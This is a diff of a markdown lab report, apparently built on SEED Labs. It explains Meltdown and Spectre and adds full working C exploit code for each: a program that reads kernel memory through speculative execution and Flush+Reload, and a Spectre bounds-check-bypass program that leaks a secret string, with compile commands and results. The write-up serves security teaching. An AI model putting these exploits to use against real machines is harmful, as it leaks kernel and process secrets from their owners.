@@ -1,5 +1,13 @@
 # Meltdown and Spectre attack exploit
 
+
+
+<H2>Sections</H2>
+
+1. [Meltdown Attack](#meltdown-attack-in-c)
+2. [Spectre Attack](#spectre-attack-in-c)
+3. [References](#references)
+
 ## Introduction
 
 This report comprehensively examines Spectre and Meltdown vulnerabilities. Our goal is to dissect these vulnerabilities, offering a technical analysis of their underlying mechanisms. We will explore the "how" to understand the core principles and mechanisms facilitating these attacks. We will also investigate the "how to" by methodically deconstructing the techniques used for execution. Lastly, we will thoroughly examine "how to mitigate" these threats, explaining the strategies and defences in place to protect systems and valuable data.
@@ -15,12 +23,20 @@ This report comprehensively examines Spectre and Meltdown vulnerabilities. Our g
 
 
 
-# Meltdown Attack in C
+## Meltdown Attack in C
 Meltdown is a vulnerability that exploits the flaw inside the Intel CPUs, if the target machine is an AMD system, the attack will not work. 
 
+To perform this attack we need to know th following:
+* Cache timing 
+* Flush+Reload
+* Side channel attack via cache 
+* Kernel space vs User space 
+* 
 
+### Step 1: Cache Timing
+The following code below tests how cache timing works and how it prepares us to perform a meltdown attack/
 
-### Step 1: Reading Cache vs Memory 
+#### Code Explanation
 
 ```c
 #include <emmintrin.h>
@@ -54,6 +70,7 @@ int main(int argc, const char **argv) {
 ```
 
 We ran this code on Ubuntu 16.04 on an Intel based System. To compile the following code:
+
 ```bash
 gcc -march=native cachetime.c
 ```
@@ -102,99 +119,11 @@ Access time for array[7*4096]: 66 CPU cycles
 Access time for array[8*4096]: 332 CPU cycles
 Access time for array[9*4096]: 400 CPU cycles
 ```
-4.
 
-```
-Access time for array[0*4096]: 1522 CPU cycles
-Access time for array[1*4096]: 404 CPU cycles
-Access time for array[2*4096]: 394 CPU cycles
-Access time for array[3*4096]: 60 CPU cycles
-Access time for array[4*4096]: 410 CPU cycles
-Access time for array[5*4096]: 398 CPU cycles
-Access time for array[6*4096]: 354 CPU cycles
-Access time for array[7*4096]: 62 CPU cycles
-Access time for array[8*4096]: 360 CPU cycles
-Access time for array[9*4096]: 336 CPU cycles
-```
-5.
-```
-Access time for array[0*4096]: 1526 CPU cycles
-Access time for array[1*4096]: 1274 CPU cycles
-Access time for array[2*4096]: 402 CPU cycles
-Access time for array[3*4096]: 64 CPU cycles
-Access time for array[4*4096]: 392 CPU cycles
-Access time for array[5*4096]: 396 CPU cycles
-Access time for array[6*4096]: 408 CPU cycles
-Access time for array[7*4096]: 58 CPU cycles
-Access time for array[8*4096]: 330 CPU cycles
-Access time for array[9*4096]: 324 CPU cycles
-```
-6.
-```
-Access time for array[0*4096]: 1702 CPU cycles
-Access time for array[1*4096]: 346 CPU cycles
-Access time for array[2*4096]: 402 CPU cycles
-Access time for array[3*4096]: 68 CPU cycles
-Access time for array[4*4096]: 420 CPU cycles
-Access time for array[5*4096]: 416 CPU cycles
-Access time for array[6*4096]: 428 CPU cycles
-Access time for array[7*4096]: 68 CPU cycles
-Access time for array[8*4096]: 412 CPU cycles
-Access time for array[9*4096]: 408 CPU cycles
-```
-7.
-```
-Access time for array[0*4096]: 1648 CPU cycles
-Access time for array[1*4096]: 342 CPU cycles
-Access time for array[2*4096]: 336 CPU cycles
-Access time for array[3*4096]: 82 CPU cycles
-Access time for array[4*4096]: 358 CPU cycles
-Access time for array[5*4096]: 542908 CPU cycles
-Access time for array[6*4096]: 362 CPU cycles
-Access time for array[7*4096]: 78 CPU cycles
-Access time for array[8*4096]: 626 CPU cycles
-Access time for array[9*4096]: 350 CPU cycles
-```
-8.
-```
-Access time for array[0*4096]: 1560 CPU cycles
-Access time for array[1*4096]: 328 CPU cycles
-Access time for array[2*4096]: 382 CPU cycles
-Access time for array[3*4096]: 52 CPU cycles
-Access time for array[4*4096]: 400 CPU cycles
-Access time for array[5*4096]: 390 CPU cycles
-Access time for array[6*4096]: 390 CPU cycles
-Access time for array[7*4096]: 68 CPU cycles
-Access time for array[8*4096]: 392 CPU cycles
-Access time for array[9*4096]: 386 CPU cycles
-```
-9.
-```
-Access time for array[0*4096]: 1538 CPU cycles
-Access time for array[1*4096]: 336 CPU cycles
-Access time for array[2*4096]: 362 CPU cycles
-Access time for array[3*4096]: 54 CPU cycles
-Access time for array[4*4096]: 352 CPU cycles
-Access time for array[5*4096]: 406 CPU cycles
-Access time for array[6*4096]: 408 CPU cycles
-Access time for array[7*4096]: 56 CPU cycles
-Access time for array[8*4096]: 396 CPU cycles
-Access time for array[9*4096]: 1248 CPU cycles
-```
-10.
-```
-Access time for array[0*4096]: 1788 CPU cycles
-Access time for array[1*4096]: 350 CPU cycles
-Access time for array[2*4096]: 336 CPU cycles
-Access time for array[3*4096]: 76 CPU cycles
-Access time for array[4*4096]: 324 CPU cycles
-Access time for array[5*4096]: 334 CPU cycles
-Access time for array[6*4096]: 334 CPU cycles
-Access time for array[7*4096]: 76 CPU cycles
-Access time for array[8*4096]: 330 CPU cycles
-Access time for array[9*4096]: 418 CPU cycles
-```
+A diagram below illustrates Cache vs Main Memory read time
 
+![diagram1](https://cdn.discordapp.com/attachments/1131246972372791429/1162073758257905664/image.png?ex=653a9c86&is=65282786&hm=4272068e9ec7b1d773d5eafc637ad8af4d9e218020921e4c2ed33d53c17a432b&)
+Diagram from: [SEEDLabs Meltdown Lab](https://seedsecuritylabs.org/Labs_16.04/PDF/Meltdown_Attack.pdf)
 
 ### Step 2: Side Channel attack via Cache
 
@@ -259,7 +188,6 @@ void reloadSideChannel()
         printf("The Secret = %d.\n",i);
    }
   } 
-
 }
 
 int main(int argc, const char **argv)
@@ -281,7 +209,10 @@ gcc -march=native FlushReload.c -o FlushReload
 #### Results:
 ![Image2](https://cdn.discordapp.com/attachments/1131246972372791429/1161250215957909564/image.png?ex=65379d8a&is=6525288a&hm=930ef633fd8a5d7bedd4f37cbb02659cb44cf447023b802a5c9dc721a0d3469d&)
 
-We get the value of secret based off side-channel attack by exploiting the cache time. Again, if the target computer is not running on an Intel CPU, this attack will not find the secret. In addition, to measure the accuracy, run the program multiple times to see the consistency of finding the secret.   
+We get the value of secret based by using flush+reload and side-channel attack by exploiting the cache time. In addition, to measure the accuracy, run the program multiple times to see the consistency of finding the secret. The diagram below illustrates how we accessed 94 by using the victim function due to cache storage. 
+
+![diagram2](https://cdn.discordapp.com/attachments/1131246972372791429/1162073942861824121/image.png?ex=653a9cb2&is=652827b2&hm=da03087f5b1a493d3b9dbb9cd20fb5e19bfa6ae240d0177b49249b3ba78f3cf4&)
+Diagram from: [SEEDLabs Meltdown Lab](https://seedsecuritylabs.org/Labs_16.04/PDF/Meltdown_Attack.pdf)
 
 ### Explanation:
 
@@ -361,6 +292,14 @@ module_init(test_proc_init);
 module_exit(test_proc_cleanup);
 ```
 
+In order for meltdown to work you need to have:
+* The target memory address
+  * Attackers have to figure out a way to get the address or guess the possible kernel addresses
+* Secret data has to be cached
+
+Meltdown is built to exploit a race condition of modern processors, allowing user-level programs to read kernel memory. This allows attackers to gain sensitive information of the target machine 
+
+The code above injects a secret string into the kernel memory, at user level we shouldn't be able to access this data and read it. Running the commands below will allow us to inject a secret as an example for this demonstration. 
 
 ```shell
 $ make
@@ -368,13 +307,12 @@ $ sudo insmod MeltdownKernel.ko
 $ dmesg | grep 'secret data address'
 ```
 
-The secret data was cached into the address: **0xf9de1000**
+
+The secret data was stored in kernel memory address: **0xf9de1000** (Address varies from machines)
+
 **Terminal Output:**
+
 ![Image3](https://cdn.discordapp.com/attachments/1131246972372791429/1161265381206405170/image.png?ex=6537abaa&is=652536aa&hm=9e9d5df99b8fd3ff86d32e5559e3c8bc287dea0647a02d987a570629938f82f0&)
-
-
-
-
 
 
 #### Step 4: Out-of-Order Execution
@@ -497,3 +435,334 @@ During the **Out-of-Order execution**, the referenced memory is fetched into a r
 
 
 
+### Step 5 Performing the Meltdown experiment and retrieving kernel data
+```c
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <setjmp.h>
+#include <fcntl.h>
+#include <emmintrin.h>
+#include <x86intrin.h>
+
+/*********************** Flush + Reload ************************/
+uint8_t array[256*4096];
+/* cache hit time threshold assumed*/
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+void flushSideChannel()
+{
+  int i;
+
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
+
+  //flush the values of the array from cache
+  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
+}
+
+static int scores[256];
+
+void reloadSideChannelImproved()
+{
+  int i;
+  volatile uint8_t *addr;
+  register uint64_t time1, time2;
+  int junk = 0;
+  for (i = 0; i < 256; i++) {
+     addr = &array[i * 4096 + DELTA];
+     time1 = __rdtscp(&junk);
+     junk = *addr;
+     time2 = __rdtscp(&junk) - time1;
+     if (time2 <= CACHE_HIT_THRESHOLD)
+        scores[i]++; /* if cache hit, add 1 for this value */
+  }
+}
+/*********************** Flush + Reload ************************/
+
+void meltdown_asm(unsigned long kernel_data_addr, int idx)
+{
+   char kernel_data = 0;
+   // Give eax register something to do
+   asm volatile(
+       ".rept 400;"                
+       "add $0x141, %%eax;"
+       ".endr;"                    
+    
+       :
+       :
+       : "eax"
+   ); 
+    
+   // Read kernel data, this will cause seg fault
+   kernel_data = *(char*)(kernel_data_addr + idx);  
+   array[kernel_data * 4096 + DELTA] += 1;              
+}
+
+// signal handler to handle the seg fault when reading kernel data
+static sigjmp_buf jbuf;
+static void catch_segv()
+{
+   siglongjmp(jbuf, 1);
+}
+
+int get(int idx)
+{
+  int i, j, ret = 0;
+  
+  // Register signal handler
+  signal(SIGSEGV, catch_segv);
+
+
+  int fd = open("/proc/secret_data", O_RDONLY);
+  if (fd < 0) {
+    perror("open");
+    return -1;
+  }
+  
+  memset(scores, 0, sizeof(scores));
+  // flush the data out
+  flushSideChannel();
+  
+	  
+  // Retry 1000 times on the same address.
+  for (i = 0; i < 1000; i++) {
+    // Causes the secret data to be cached
+		ret = pread(fd, NULL, 0, 0);
+		if (ret < 0) {
+	  	perror("pread");
+	  	break;
+		}
+	
+		// Flush the probing array
+		for (j = 0; j < 256; j++) 
+			_mm_clflush(&array[j * 4096 + DELTA]);
+
+		if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xf9d1b000, idx); }
+    // reload for flush+reload
+		reloadSideChannelImproved();
+
+  }
+
+  // Find the index with the highest score.
+  int max = 0;
+  for (i = 0; i < 256; i++) {
+		if (scores[max] < scores[i]) max = i;
+	}
+
+  printf("The secret value is %d %c\n", max, max);
+  printf("The number of hits is %d\n", scores[max]);
+
+  return 0;
+}
+
+
+int main(){	
+	int i=0;
+	for(i=0; i<8;i++){
+		get(i);
+	}
+	return 0;
+}
+```
+
+
+In main(), replace the address with the appropriate address when ran MeltdownKernel.ko.
+```c 
+meltdown_asm(0xf9d1b000, idx)
+```
+
+Our findings:
+
+![meltdownfinding](https://media.discordapp.net/attachments/1131246972372791429/1161710329441570888/image.png?ex=65394a0e&is=6526d50e&hm=9736c823c046baaabe0c7c608fb3f27b135c84aae38f7b1ff2e75ee33efe5087&=)
+
+
+The attack was successful into accessing the kernel memory.
+
+### Explanation
+> <h3>Out of order execution & Side channel attack </h3>
+> The meltdown_asm() tricks the CPU into executing code that accesses kernel memory. 
+> This function reads a byte of kernel data (kernel_data) by reading a specific memory address (kernel_data_addr), which would normally result in a segmentation fault due to unauthorized access to kernel memory.
+> 
+> During the execution of meltdown_asm, the CPU engages in speculative execution. The instructions within the function are executed out of order, even though it contains a memory access that should not be allowed.
+> 
+> Although the actual memory access should lead to an exception, the CPU speculatively loads data into registers and cache. The data loaded into cache includes the value of kernel_data, which is derived from the inaccessible kernel memory.
+
+
+> After the speculative execution, the code accesses the array, incrementing a specific location within it based on the value of kernel_data. This is a side-channel attack: if kernel_data is in cache, the access to the array will be faster (a cache hit), and if it's not in cache, the access will be slower (a cache miss).
+>
+
+> <h3>Determining the Secret value by cache time analysis</h3>
+> The get() function iterates through multiple attempts of executing meltdown_asm. By measuring the time it takes to access the array after each speculative execution, it accumulates scores for different values of kernel_data, based on whether they were in cache or not.
+>
+> 
+> The get() function then analyzes the scores to identify which value of kernel_data was most likely in cache, assuming it corresponds to a valid kernel memory location. This value is printed as the "secret value."
+
+![OoO](https://cdn.discordapp.com/attachments/1131246972372791429/1162073988479070278/image.png?ex=653a9cbd&is=652827bd&hm=47323c9f74ac9aa5b752b9758d46911abc9b7fc73482cf40ce0eb385df42b57a&)
+Diagram from: [SEEDLabs Meltdown Lab](https://seedsecuritylabs.org/Labs_16.04/PDF/Meltdown_Attack.pdf)
+
+<h3>Out of order execution</h3>
+
+>The above diagram displays how out of order execution works. 
+> Modern processors use speculative execution to boost performance. When a processor encounters a branching instruction (like an "if" statement), it often doesn't know which branch to take until it evaluates the condition. To save time, the processor speculatively executes both branches simultaneously, making an educated guess about which one is more likely.
+>
+> During this speculative execution, instructions are processed out of their normal order, meaning they may not finish in the same sequence as they appear in the program. This approach keeps the CPU busy and avoids delays caused by data dependencies. The processor keeps track of this execution order with a re-order buffer (ROB).
+> 
+> While executing out of order, the processor can run into exceptions or privilege issues when trying to access protected memory, such as kernel memory from a user-space process. Typically, exceptions result in errors, and the CPU discards the results of speculative execution. However, sometimes the processor doesn't discard these results right away.
+> 
+> The Meltdown attack capitalizes on the timing variations produced by the processor's speculative execution. Even though speculative execution should be thrown away, data might still end up in the cache during this phase. This attack focuses on the timing differences related to memory access to figure out if specific data is in the cache.
+>
+> By catching the exception and monitoring cache timing, an attacker can figure out whether certain data is present in the cache. In the case of Meltdown, this technique is used to learn the contents of privileged kernel memory, which should be off-limits to a user-level process.
+> 
+> Once the attacker confirms that a piece of privileged data is in the cache, they can use various methods to retrieve this data. This includes reading cache lines, measuring access times, or even employing side-channel attacks to deduce specific data bits.
+
+
+## Spectre Attack in C
+
+A Spectre attack is a type of security vulnerability that **exploits speculative execution** in modern microprocessors to access sensitive data. Potentially compromising the confidentiality of information. It allows attackers to trick a processor into **speculatively executing code** that should not be accessible, resulting in the leakage of sensitive data. This techniques to this is similar to that of meltdown as we still use:
+* Cache Timing
+* Flush+Reload
+* Out-of-Order Execution
+
+We will now demonstrate the entire Spectre Attack all at once using the following code below. The aim of this program is to access the **`buffer[x]`** that is within **`restrictedAccess`** just like our previous **Out-of-order execution**.
+Note that we have calculated the offset of the secret from the beginning of the buffer, this is done through **`s = restrictedAccess(larger_x);`**, **`array[s*4096 + DELTA] += 88;`** and **`size_t larger_x = (size_t)(secret - (char*)buffer);`**.
+
+
+```c
+#include <emmintrin.h>
+#include <x86intrin.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
+
+unsigned int buffer_size = 10;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
+uint8_t temp = 0;
+char *secret = "Some Secret Value";   
+uint8_t array[256*4096];
+
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+// Sandbox Function
+uint8_t restrictedAccess(size_t x)
+{
+  if (x < buffer_size) {
+     return buffer[x];
+  } else {
+     return 0;
+  } 
+}
+
+void flushSideChannel()
+{
+  int i;
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
+  //flush the values of the array from cache
+  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
+}
+
+static int scores[256];
+void reloadSideChannelImproved()
+{
+  int i;
+  volatile uint8_t *addr;
+  register uint64_t time1, time2;
+  int junk = 0;
+  for (i = 0; i < 256; i++) {
+    addr = &array[i * 4096 + DELTA];
+    time1 = __rdtscp(&junk);
+    junk = *addr;
+    time2 = __rdtscp(&junk) - time1;
+    if (time2 <= CACHE_HIT_THRESHOLD)
+      scores[i]++; /* if cache hit, add 1 for this value */
+  } 
+}
+
+void spectreAttack(size_t larger_x)
+{
+  int i;
+  uint8_t s;
+  volatile int z;
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+  // Train the CPU to take the true branch inside victim().
+  for (i = 0; i < 10; i++) {
+    _mm_clflush(&buffer_size);
+    for (z = 0; z < 100; z++) { }
+    restrictedAccess(i);  
+  }
+  // Flush buffer_size and array[] from the cache.
+  _mm_clflush(&buffer_size);
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+  // Ask victim() to return the secret in out-of-order execution.
+  for (z = 0; z < 100; z++) { }
+  s = restrictedAccess(larger_x);
+  array[s*4096 + DELTA] += 88;
+}
+
+int getascii(size_t larger_x)
+{
+  int i;
+  uint8_t s;
+  flushSideChannel();
+  _mm_clflush(&larger_x);
+  for (i = 0;i< 256;i++) scores[i] = 0;
+  for (i = 0;i< 1000;i++) {
+    spectreAttack(larger_x);
+    reloadSideChannelImproved();
+  }
+
+  int max = 1;
+  for (i = 2; i < 256; i ++ ) {
+    if(scores[max] < scores[i]) max = i;
+  }
+
+  if (scores[max] == 0) {
+    return 0;
+  } else {
+    return max;
+  }
+}
+
+int main() {
+  size_t larger_x = (size_t)(secret-(char*)buffer);
+  int s = getascii(larger_x);
+  printf("The secret is:\n");
+  while(s != 0) {
+    printf("%c\n",s);
+    larger_x++;
+    s = getascii(larger_x);
+  }
+  return 0;
+}
+```
+Compilation:
+```
+gcc -march=native SpectreExperiment.c -o SpectreExperiment
+```
+
+Result:
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161716525506515055/image.png?ex=65394fd3&is=6526dad3&hm=fc2992011d0b7c7a19e35cbf6cbe2cc20ce61d3057cce5dac83ae619515fc7ea&)
+As we can see, we have successfully performed a Spectre Attack and gained the secret value `"Some Secret Value"`.
+
+
+
+## References
+
+> (No date) Computer security: A hands-on approach | udemy. Available at: https://www.udemy.com/course/du-computer-security/ (Accessed: 12 October 2023). 
+> 
+> Dingchang (no date) Dingchang/Seedlab, GitHub. Available at: https://github.com/Dingchang/SeedLab/tree/master (Accessed: 13 October 2023). 
+> 
+> Kocher, P. et al. (2018) Spectre attacks: Exploiting speculative execution, arXiv.org. Available at: https://arxiv.org/abs/1801.01203 (Accessed: 13 October 2023). 
+> 
+> Lipp, M. et al. (2018) Meltdown, arXiv.org. Available at: https://arxiv.org/abs/1801.01207 (Accessed: 13 October 2023). 
+> 
+> SamuelXing (no date) Samuelxing/MeltdownDemo: Meltdown attack demo., GitHub. Available at: https://github.com/SamuelXing/MeltdownDemo/tree/master (Accessed: 13 October 2023). 
+> 
+> SEEDLabs Meltdown Attack (no date) Meltdown attack lab. Available at: https://seedsecuritylabs.org/Labs_16.04/System/Meltdown_Attack/ (Accessed: 13 October 2023). 
+>
+> SEEDLabs Spectre Attack (no date) Spectre attack lab. Available at: https://seedsecuritylabs.org/Labs_16.04/System/Spectre_Attack/ (Accessed: 13 October 2023). 
